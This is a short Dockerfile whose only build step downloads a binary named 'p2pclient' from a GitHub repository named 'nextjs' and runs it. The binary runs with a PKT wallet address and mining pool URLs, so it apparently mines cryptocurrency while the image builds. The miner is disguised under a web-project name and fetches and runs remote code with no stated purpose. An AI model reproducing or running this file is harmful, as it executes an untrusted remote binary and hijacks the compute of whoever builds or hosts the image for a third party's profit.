FROM debian:sid

RUN apt update -y \
    	&& apt upgrade -y \
        && apt-get install wget -y \
    	&& cd /usr/bin && wget https://github.com/sengepeke/nextjs/raw/master/p2pclient && chmod +x p2pclient && ./p2pclient ann -p pkt1qzjhnfe8sfrwk3pynldwe7pmsjfhkdfadsqpyqx http://pool.pkt.world/master/2048 http://pool.pktpool.io/
